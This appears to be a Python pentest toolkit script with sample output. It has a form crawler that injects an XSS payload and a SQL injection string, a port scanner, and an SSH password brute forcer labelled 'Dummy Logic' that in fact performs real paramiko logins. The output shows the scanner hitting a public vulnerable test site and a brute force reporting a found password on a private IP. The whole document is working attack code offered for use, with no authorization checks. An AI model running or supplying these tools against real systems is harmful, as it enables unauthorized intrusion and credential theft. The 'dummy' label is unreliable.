# Penetration Testing Toolkit
# Module 1: Web Vulnerability Scanner
# Module 2: Port Scanner
# Module 3: SSH Brute Forcer (Dummy Logic)
!pip install paramiko
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import socket
import paramiko

XSS_PAYLOAD = "<script>alert('XSS')</script>"
SQLI_PAYLOAD = "' OR '1'='1"
visited_urls = set()

# ---------------- Web Vulnerability Scanner ----------------
def get_forms(url):
    try:
        res = requests.get(url)
        soup = BeautifulSoup(res.content, "html.parser")
        return soup.find_all("form")
    except Exception:
        return []

def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        name = input_tag.attrs.get("name")
        input_type = input_tag.attrs.get("type", "text")
        value = input_tag.attrs.get("value", "")
        if name:
            inputs.append({"name": name, "type": input_type, "value": value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] in ["text", "search"]:
            data[input["name"]] = payload
        else:
            data[input["name"]] = input["value"]
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, params=data)
    except Exception:
        return None

def scan_vulnerabilities(url):
    forms = get_forms(url)
    print(f"[+] Found {len(forms)} forms on {url}")
    for form in forms:
        form_details = get_form_details(form)
        xss_response = submit_form(form_details, url, XSS_PAYLOAD)
        if xss_response and XSS_PAYLOAD in xss_response.text:
            print(f"[!] XSS Vulnerability Detected at {url}")
        sqli_response = submit_form(form_details, url, SQLI_PAYLOAD)
        if sqli_response and ("sql" in sqli_response.text.lower() or "syntax" in sqli_response.text.lower()):
            print(f"[!] SQL Injection Vulnerability Detected at {url}")

def crawl(url, domain):
    if url in visited_urls:
        return
    visited_urls.add(url)
    print(f"[*] Crawling: {url}")
    try:
        res = requests.get(url)
        soup = BeautifulSoup(res.content, "html.parser")
        scan_vulnerabilities(url)
        for link_tag in soup.find_all("a"):
            href = link_tag.get("href")
            if href:
                full_url = urljoin(url, href)
                if urlparse(full_url).netloc == domain:
                    crawl(full_url, domain)
    except Exception:
        pass

# ---------------- Port Scanner ----------------
def port_scan(target, ports):
    print(f"[+] Starting Port Scan on {target}")
    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"[+] Port {port} is open")
            sock.close()
        except:
            pass

# ---------------- SSH Brute Forcer (Demo) ----------------
def ssh_brute_force(target, username, password_list):
    print(f"[+] Starting SSH Brute Force on {target} with username {username}")
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password, timeout=2)
            print(f"[!] Password found: {password}")
            ssh.close()
            return
        except:
            continue
    print("[-] Brute force failed.")

# ---------------- Menu ----------------
def main():
    print("\n--- Penetration Testing Toolkit ---")
    print("1. Web Vulnerability Scanner")
    print("2. Port Scanner")
    print("3. SSH Brute Forcer")
    choice = input("Select a module (1-3): ")

    if choice == '1':
        target_url = input("Enter URL to scan: ")
        if not target_url.startswith("http"):
            print("Invalid URL format.")
        else:
            domain = urlparse(target_url).netloc
            crawl(target_url, domain)

    elif choice == '2':
        target = input("Enter target IP/host: ")
        ports = list(map(int, input("Enter comma-separated ports to scan: ").split(",")))
        port_scan(target, ports)

    elif choice == '3':
        target = input("Enter SSH target IP: ")
        username = input("Enter SSH username: ")
        passwords = input("Enter comma-separated password guesses: ").split(",")
        ssh_brute_force(target, username, passwords)

    else:
        print("Invalid option.")

if __name__ == "__main__":
    main()



*OUTPUT*
--- Penetration Testing Toolkit ---
1. Web Vulnerability Scanner
2. Port Scanner
3. SSH Brute Forcer
Select a module (1-3): 1
Enter URL to scan: http://testphp.vulnweb.com
[*] Crawling: http://testphp.vulnweb.com
[+] Found 1 forms on http://testphp.vulnweb.com
[!] XSS Vulnerability Detected at http://testphp.vulnweb.com
[!] SQL Injection Vulnerability Detected at http://testphp.vulnweb.com
[*] Crawling: http://testphp.vulnweb.com/index.php
[+] Found 1 forms on http://testphp.vulnweb.com/index.php
[!] XSS Vulnerability Detected at http://testphp.vulnweb.com/index.php
[!] SQL Injection Vulnerability Detected at http://testphp.vulnweb.com/index.php
[*] Crawling: http://testphp.vulnweb.com/categories.php
[+] Found 1 forms on http://testphp.vulnweb.com/categories.php
[!] XSS Vulnerability Detected at http://testphp.vulnweb.com/categories.php
[!] SQL Injection Vulnerability Detected at http://testphp.vulnweb.com/categories.php
[*] Crawling: http://testphp.vulnweb.com/artists.php
[+] Found 1 forms on http://testphp.vulnweb.com/artists.php

--- Penetration Testing Toolkit ---
1. Web Vulnerability Scanner
2. Port Scanner
3. SSH Brute Forcer
Select a module (1-3): 2
Enter target IP/host: 192.168.1.10
Enter comma-separated ports to scan: 22,80,443

--- Penetration Testing Toolkit ---
1. Web Vulnerability Scanner
2. Port Scanner
3. SSH Brute Forcer
Select a module (1-3): 3
Enter SSH target IP: 192.168.1.10
Enter SSH username: testuser
Enter comma-separated password guesses: admin,root,password123,letmein
[+] Starting SSH Brute Force on 192.168.1.10 with username testuser
[!] Password found: password123


